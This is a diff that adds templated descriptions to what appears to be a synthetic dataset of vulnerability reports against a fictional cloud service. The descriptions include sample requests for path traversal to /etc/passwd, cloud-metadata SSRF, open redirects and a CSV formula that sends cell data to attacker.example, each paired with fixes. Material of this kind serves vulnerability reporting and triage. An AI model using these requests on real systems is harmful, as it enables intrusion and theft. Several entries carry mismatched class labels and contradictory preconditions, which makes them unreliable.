@@ -2110,7 +2125,8 @@
           "offset": "2d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2274,7 +2290,8 @@
           "offset": "8d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2414,7 +2431,8 @@
           "offset": "5d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.nebelstein-cloud.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2528,7 +2546,8 @@
           "offset": "5d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.nebelstein-cloud.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2688,7 +2707,8 @@
           "offset": "6d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2822,7 +2842,8 @@
           "offset": "5d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2982,7 +3003,8 @@
           "offset": "4d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.nebelstein-cloud.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3122,7 +3144,8 @@
           "offset": "1d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3249,7 +3272,8 @@
           "offset": "3d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3361,7 +3385,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.nebelstein-cloud.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3516,7 +3541,8 @@
           "offset": "8d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.nebelstein-cloud.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3684,7 +3710,8 @@
           "offset": "6d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3795,7 +3822,8 @@
           "offset": "1d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.nebelstein-cloud.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3935,7 +3963,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4062,7 +4091,8 @@
           "offset": "1d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4194,7 +4224,8 @@
           "offset": "1d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.nebelstein-cloud.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4306,7 +4337,8 @@
           "offset": "4d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.nebelstein-cloud.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4417,7 +4449,8 @@
           "offset": "3d 6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4533,7 +4566,8 @@
           "offset": "2d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4665,7 +4699,8 @@
           "offset": "1d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4811,7 +4846,8 @@
           "offset": "10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4900,7 +4936,8 @@
           "offset": "1d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5015,7 +5052,8 @@
           "offset": "1d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.nebelstein-cloud.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5158,7 +5196,8 @@
           "offset": "7d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.nebelstein-cloud.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5299,7 +5338,8 @@
           "offset": "3d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5438,7 +5478,8 @@
           "offset": "7d 22h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.nebelstein-cloud.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5560,7 +5601,8 @@
           "offset": "2d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5691,7 +5733,8 @@
           "offset": "4d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5783,7 +5826,8 @@
           "offset": "1d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.nebelstein-cloud.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5897,7 +5941,8 @@
           "offset": "3d 22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.nebelstein-cloud.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6053,7 +6098,8 @@
           "offset": "5d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.nebelstein-cloud.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6217,7 +6263,8 @@
           "offset": "5d 23h",
